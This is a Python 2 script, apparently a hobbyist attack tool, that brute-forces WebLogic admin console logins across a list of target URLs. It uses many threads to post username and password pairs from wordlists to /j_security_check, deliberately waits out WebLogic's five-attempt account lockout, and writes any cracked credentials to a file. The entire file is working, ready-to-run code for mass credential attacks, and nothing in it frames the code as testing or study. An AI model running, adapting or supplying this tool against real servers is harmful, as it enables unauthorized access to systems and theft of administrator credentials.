#coding=utf-8
import Queue
import requests
import time
import threading
import sys
import os
'''
Version 6
Copyright dc3
http://185.es
Finish at 2015-10-7 15:20
稍微修改了一下post的逻辑
添加Error指示
Usage:python main.py 200
'''
def post(i):
	global xtime
	global success
	global fail
	global error
	pwdcount=len(open('pwd.txt','rU').readlines())
	usrcount=len(open('usr.txt','rU').readlines())
	sum=pwdcount*usrcount #总尝试次数=用户名个数*密码个数
	co=0
	for usr in open("usr.txt").readlines():
		usr=usr.strip('\n')
		z=0
		for pwd in open("pwd.txt").readlines():
			pwd=pwd.strip('\n')
			#print 'weblogic'+'/'+pwd
			z+=1
			co+=1
			if z == 6:	#账户错误达到5次，此账户锁定30分钟，等待重试
				print i+' Waiting......'
				ct=0
				b=31
				while (ct<b):
					ncount=b-ct
					ncount='%d' %ncount
					print i+'\n'+ncount+'min left'
					time.sleep(60)
					ct+=1
				z=1 #重置计数
			#print i+'/'+usr+'/'+pwd
			data = {'j_username':usr,'j_password':pwd}
			try:
				s = requests.post(i+'/j_security_check',data =data,timeout=5)
				if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
					print i,'Success!!!!!' 
					success+=1
					print usr+'/'+pwd
					f=open(xtime+'.txt', 'a')
					f.write(i+' ')
					f.write(usr+'/')
					f.write(pwd+'\n')
					f.close()
					s=0
					return #成功，停止循环
				elif co == sum: #达到总尝试次数，则输出失败
					print i,'Failed!'
					fail+=1
					f = open(xtime+'bad.txt', 'a')
					f.write(i+'\n')
					f.close()
					s = 0
					return #失败，停止循环
			except:
				print i,'Error!'
				error+=1
				f = open(xtime+'error.txt', 'a')
				f.write(i+'\n')
				f.close()
				s = 0

def main():
	global xtime
	global success
	global fail
	global error
	error=0
	success=0
	fail=0
	xtime=time.strftime("%Y-%m-%d[%H.%M.%S]")
	print xtime
	MaxThreads=sys.argv[1]
	MaxThreads=int(MaxThreads)
	mythreads = Queue.Queue(maxsize = 0) 
	for i in open("u.txt").readlines():#先将所有线程装入队列，等待取出
		i=i.strip('\n')
		t=threading.Thread(target=post, args=(i,))
		t.setDaemon(True)
		mythreads.put(t)
	print 'Total Threads:%d' %MaxThreads
	print 'Total URLs:%d' %mythreads.qsize()
	time.sleep(2)
	while True:#若条件都不满足，则死循环
		if(threading.active_count() == 1 and mythreads.qsize() == 0): #若剩余URL数等于0,活动线程为1，则退出.主线程占一个 #2015-9-28 00:43 Fixed
			print 'Done at %s' %time.strftime("%Y-%m-%d[%H.%M.%S]")
			break
		elif(threading.active_count() < MaxThreads): #判断正在运行的线程数量,如果小于输入值则继续添加线程
			if (mythreads.qsize() ==0 ): #如果剩余URL为0，则不从列队中读取(否则一直处于卡死状态)，并改变窗口标题提示用户 #2015-9-28 20:15 Fixed
				os.system("title No URL left,waiting to exit,Current threads: %d,Success:%d,Failed:%d,Error:%d" %(threading.active_count(),success,fail,error))
				time.sleep(60) #60秒之后回到上一个if判断线程是否全部结束
			else:
				os.system("title Current threads: %d,URLs left: %d,Success:%d,Failed:%d,Error:%d" %(threading.active_count(),mythreads.qsize(),success,fail,error)) #更改窗口标题，如觉得太消耗CPU资源可以注释掉 #线程及URL的变化只会在启动线程时变化 2015-10-2 22:30 Fixed
				t=mythreads.get() #取出一个线程
				t.start() #加载该线程
				t.join(1) #阻塞一秒钟，然后加载下个线程，不愿意等可以注释掉
	print 'Success:%d,Failed:%d,Error:%d' %(success,fail,error)


if __name__ == '__main__':
	main()
